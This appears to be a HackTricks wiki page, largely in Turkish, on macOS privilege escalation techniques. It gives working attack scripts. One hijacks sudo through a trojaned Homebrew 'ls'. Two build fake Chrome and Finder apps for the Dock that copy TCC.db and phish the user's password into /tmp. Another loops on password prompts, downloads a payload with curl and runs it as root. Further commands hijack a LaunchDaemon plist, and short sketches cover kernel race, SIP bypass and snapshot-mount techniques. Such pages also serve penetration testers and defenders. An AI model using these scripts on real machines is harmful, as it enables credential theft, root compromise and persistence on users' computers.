# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

If you came here looking for TCC privilege escalation go to:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Kullanıcı Etkileşimi

### Sudo Hijacking

Orijinal [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) burada bulabilirsiniz.

Ancak, macOS bir kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`**'ini **korur**. Bu da bu saldırıyı gerçekleştirmenin başka bir yolunun, kurbanın **running sudo** sırasında çalıştıracağı diğer **binaries**'leri **hijack etmek** olacağı anlamına gelir:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Terminali kullanan bir kullanıcının muhtemelen **Homebrew yüklü** olacağını unutmayın. Bu nedenle **`/opt/homebrew/bin`** içindeki ikili dosyaları ele geçirmek mümkün olabilir.

### Dock Impersonation

Birkaç **social engineering** kullanarak Dock içinde **örneğin Google Chrome'u taklit edebilir** ve aslında kendi script'inizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Bazı öneriler:

- Dock'ta Chrome olup olmadığını kontrol edin; eğer varsa o girişi **kaldırın** ve Dock dizisinde **aynı konuma** sahte **Chrome girişini** **ekleyin**.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- You **cannot remove Finder from the Dock**, bu yüzden Dock'a ekleyecekseniz, sahte Finder'ı gerçek olanın hemen yanına koyabilirsiniz. Bunun için **add the fake Finder entry at the beginning of the Dock array**.
- Başka bir seçenek onu Dock'a koymamak ve sadece açmaktır; "Finder asking to control Finder" o kadar garip değildir.
- Bir diğer seçenek, parolayı sormadan korkunç bir kutu ile **escalate to root without asking** yapmak yerine, Finder'ın gerçekten yetkili bir işlem yapmak için parola sormasını sağlamaktır:
- Finder'dan **`/etc/pam.d`** içine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parola isteyen istem, "Finder wants to copy sudo" diye gösterecektir)
- Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol edebilirsiniz; böylece parola isteyen istem, "Finder wants to copy Finder.bundle" diye gösterecektir)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Parola istemi phishing + sudo yeniden kullanımı

Kötü amaçlı yazılımlar sıklıkla kullanıcı etkileşimini kötüye kullanarak **sudo yetkisi sağlayan bir parolayı yakalar** ve bunu programlı şekilde tekrar kullanır. Yaygın akış:

1. Giriş yapmış kullanıcıyı `whoami` ile belirleyin.
2. **Parola istemlerini döngüyle tekrarlayın** `dscl . -authonly "$user" "$pw"` başarılı olana kadar.
3. Kimlik bilgilerini önbelleğe alın (ör. `/tmp/.pass`) ve `sudo -S` ile ayrıcalıklı işlemleri gerçekleştirin (password over stdin).

Örnek minimal zincir:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Çalınan parola daha sonra **Gatekeeper karantinasını `xattr -c` ile temizlemek**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşim gerektirmeden çalıştırmak için yeniden kullanılabilir.

## Yeni macOS'e özgü vektörler (2023–2025)

### Kullanımdan kaldırılmış `AuthorizationExecuteWithPrivileges` hâlâ kullanılabilir

`AuthorizationExecuteWithPrivileges` 10.7'de kullanımdan kaldırıldı ama **Sonoma/Sequoia'da hâlâ çalışıyor**. Birçok ticari güncelleyici `/usr/libexec/security_authtrampoline`'ı güvenilmeyen bir yol kullanarak çağırıyor. Eğer hedef ikili kullanıcı tarafından yazılabilir durumdaysa, bir trojan yerleştirip meşru istemi kullanabilirsiniz:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
İkna edici bir parola iletişim kutusu sunmak için **masquerading tricks above** ile birleştirin.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Eğer bir LaunchDaemon plist'i veya `ProgramArguments` hedefi **user-writable** ise, onu değiştirip ardından launchd'yi yeniden yüklemeye zorlayarak ayrıcalıkları yükseltebilirsiniz:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Bu, **CVE-2025-24085** için yayımlanan exploit desenini yansıtır; yazılabilir bir plist'in kötüye kullanılarak saldırgan kodunun root olarak çalıştırılmasına izin verildiği duruma karşılık gelir.

### XNU SMR kimlik bilgisi yarış durumu (CVE-2025-24118)

Bir **`kauth_cred_proc_update` içindeki yarış durumu**, yerel bir saldırganın salt okunur credential işaretçisini (`proc_ro.p_ucred`) bozmasına izin verir; thread'ler arasında `setgid()`/`getgid()` döngülerini yarışa sokarak yırtılmış bir `memcpy` oluşana kadar devam edilir. Başarılı bozulma **uid 0** ve kernel bellek erişimi sağlar. Minimal PoC yapısı:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
heap grooming ile kontrollü veriyi pointer'ın yeniden okuduğu yere yerleştirin. Zayıf build'lerde bu, SIP bypass gerektirmeyen güvenilir bir **local kernel privesc** sağlar.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Zaten root sahibseniz, SIP yine de sistem konumlarına yazmayı engeller. Migraine hatası, Migration Assistant'ın com.apple.rootless.install.heritable entitlement'ını kötüye kullanarak SIP bypass'ını miras alan bir alt süreç başlatır ve korumalı yolların (ör. /System/Library/LaunchDaemons) üzerine yazar. Zincir:

1. Çalışan bir sistemde root elde edin.
2. systemmigrationd'i hazırlanmış bir durumla tetikleyerek saldırgan kontrollü bir binary çalıştırın.
3. Miras kalan entitlement'ı kullanarak SIP tarafından korunan dosyaları yama yapın; yapılan değişiklikler yeniden başlatsanız bile kalıcı olur.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Birçok Apple daemon'u XPC üzerinden NSPredicate nesnelerini kabul eder ve yalnızca saldırgan tarafından kontrol edilen expressionType alanını doğrular. Rasgele selector'ları değerlendiren bir predicate oluşturarak root/system XPC servislerinde (ör. coreduetd, contextstored) code execution elde edebilirsiniz. İlk bir app sandbox escape ile birleştirildiğinde, bu kullanıcı onayı olmadan privilege escalation sağlar. Predicate'leri deserialize eden ve sağlam bir visitor'a sahip olmayan XPC endpoint'lerini arayın.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Herhangi bir kullanıcı** (yetkisiz olanlar dahil) bir Time Machine snapshot oluşturup mount edebilir ve o snapshot'taki **tüm dosyalara** erişebilir.\
Gereken **tek ayrıcalık**, kullanılan uygulamanın (ör. `Terminal`) **Full Disk Access** (FDA) iznine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır; bu izin bir admin tarafından verilmelidir.

<details>
<summary>Time Machine snapshot'ı mount et</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Daha ayrıntılı açıklama [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Hassas Bilgi

Bu, ayrıcalık yükseltme için yararlı olabilir:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referanslar

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
